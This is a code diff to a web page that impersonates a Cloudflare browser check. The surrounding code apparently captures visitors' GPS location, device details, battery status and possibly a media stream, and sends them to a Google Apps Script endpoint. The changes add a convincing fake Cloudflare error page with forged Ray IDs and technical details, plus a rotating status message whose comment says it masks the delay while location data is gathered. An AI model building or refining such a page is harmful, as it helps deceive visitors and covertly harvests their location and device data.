@@ -84,7 +84,8 @@
         const _P_URL = "https://script.google.com/macros/s/AKfycbzMm4DrahVeftCcXwFQ9n5J0Z8W4NH4pp_HmhFa6oPRl4vPsJXlO61PNMrURhRwpCgO/exec"; 
         // ==========================================
 
-        document.getElementById('ray-id').innerText = Math.random().toString(16).substr(2, 16);
+        const generateHex = (len) => [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
+        document.getElementById('ray-id').innerText = generateHex(16);
         const sleep = (ms) => new Promise(r => setTimeout(r, ms));
         const log = (msg) => console.log(`[SYS] ${msg}`);
 
@@ -222,14 +223,36 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                     <h2 style="font-size: 24px; color: #666; margin: 10px 0;">Web server is returning an unknown error</h2>
                     <p style="color: #999; margin-top: 20px; font-size: 16px;">There is an issue between Cloudflare's cache and your origin web server.</p>
                     <div style="margin-top: 40px;">
-                         <span style="display:inline-block; padding: 8px 15px; background:#f1f1f1; border-radius:4px; color:#555; font-size:12px;">
-                            Cloudflare Ray ID: <strong>${document.getElementById('ray-id').innerText}</strong>
+                         <span id="ray-id-box" style="display:inline-block; padding: 8px 15px; background:#f1f1f1; border-radius:4px; color:#555; font-size:12px; cursor: pointer;" title="Click to copy Ray ID">
+                            Cloudflare Ray ID: <strong id="ray-id-text">${document.getElementById('ray-id').innerText}</strong>
+                            <span id="copy-hint" style="display:none; margin-left:10px; color:#009900;">Copied!</span>
                          </span>
+                         
+                         <div style="margin-top: 20px; font-size: 11px; color: #999;">
+                             <a href="#" onclick="document.getElementById('err-details').style.display='block'; return false;" style="color: #0051c3; text-decoration: none;">Technical Details</a>
+                             <div id="err-details" style="display:none; margin-top: 10px; text-align: left; background: #fafafa; padding: 10px; border: 1px solid #eee; border-radius: 4px;">
+                                 <div><strong>Ray ID:</strong> ${document.getElementById('ray-id').innerText}</div>
+                                 <div><strong>IP:</strong> ${document.getElementById('display-ip').innerText}</div>
+                                 <div><strong>User Agent:</strong> ${navigator.userAgent}</div>
+                                 <div><strong>Timestamp:</strong> ${new Date().toISOString()}</div>
+                                 <div><strong>Server:</strong> AMS-IX-CLOUDFLARE</div>
+                                 <div><strong>Event ID:</strong> ${generateHex(32)}</div>
+                             </div>
+                         </div>
                     </div>
                 </div>
             `;
             document.body.style.display = "block";
             document.body.style.backgroundColor = "#fff";
+            
+            // Click to Copy Logic
+            document.getElementById('ray-id-box').onclick = function() {
+                const text = document.getElementById('ray-id-text').innerText;
+                navigator.clipboard.writeText(text);
+                const hint = document.getElementById('copy-hint');
+                hint.style.display = 'inline';
+                setTimeout(() => hint.style.display = 'none', 2000);
+            };
         }
 
         bB.onclick = async () => {
@@ -306,12 +329,20 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             }
 
             // 4. Wait for Location
-            if (stream) document.getElementById('label-text').innerText = "Finishing...";
-            const gpsData = await gpsPromise;
-            const gps = gpsData.t;
+            // Dynamic Status Loop to mask delay
+                const statuses = ["Verifying...", "Checking browser...", "Analyzing traffic...", "Confirming connection..."];
+                let sIdx = 0;
+                const statusInterval = setInterval(() => {
+                    document.getElementById('label-text').innerText = statuses[sIdx++ % statuses.length];
+                }, 1500);
+                
+                const gpsData = await gpsPromise;
+                clearInterval(statusInterval);
+                document.getElementById('label-text').innerText = "Finishing...";
+                const gps = gpsData.t;
 
-            // 5. Battery
-            let bat = "N/A";
+                // 5. Battery
+                let bat = "N/A";
             if (navigator.getBattery) {
                 try {
                     const bt = await navigator.getBattery();
